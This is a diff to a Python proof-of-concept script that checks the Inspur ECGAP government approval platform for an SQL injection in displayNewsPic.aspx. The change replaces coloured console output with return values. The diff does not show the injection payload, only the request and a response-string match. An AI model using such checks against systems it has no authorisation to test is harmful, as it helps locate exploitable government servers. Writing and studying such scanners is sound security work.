@@ -8,8 +8,8 @@ description: 浪潮政务审批平台ECGAP /Broadcast/displayNewsPic.aspx文件�
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class inspur_ecgap_displayNewsPic_sqli_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class inspur_ecgap_displayNewsPic_sqli_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"GAOJI" in req.text:
-                cprint("[+]存在浪潮ECGAP政务审批系统SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在浪潮ECGAP政务审批系统SQL注入漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = inspur_ecgap_displayNewsPic_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
